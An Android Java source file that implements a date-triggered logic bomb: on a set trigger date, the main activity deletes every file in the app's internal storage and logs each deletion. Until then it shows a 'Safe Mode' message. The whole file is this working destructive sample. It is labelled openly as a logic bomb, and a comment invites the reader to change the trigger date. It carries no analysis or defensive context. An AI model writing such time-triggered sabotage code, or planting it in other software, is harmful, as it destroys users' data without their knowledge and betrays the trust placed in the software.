package com.example.logicbomb;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {

    // Set the trigger date (YYYY-MM-DD)
    private static final String TRIGGER_DATE = "2025-04-01";  // Change this date

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (checkTrigger()) {
            executePayload();
        } else {
            Toast.makeText(this, "Safe Mode: Not triggered yet.", Toast.LENGTH_LONG).show();
        }
    }

    // Check if the current date matches the trigger date
    private boolean checkTrigger() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
        String currentDate = sdf.format(new Date());
        return currentDate.equals(TRIGGER_DATE);
    }

    // Payload: Deletes all files in the app's internal storage
    private void executePayload() {
        File dir = getFilesDir();
        if (dir.exists() && dir.isDirectory()) {
            for (File file : dir.listFiles()) {
                boolean deleted = file.delete();
                Log.e("LogicBomb", "Deleted file: " + file.getName() + " -> " + deleted);
            }
        }
        Toast.makeText(this, "Logic Bomb Triggered! Files deleted.", Toast.LENGTH_LONG).show();
    }
}
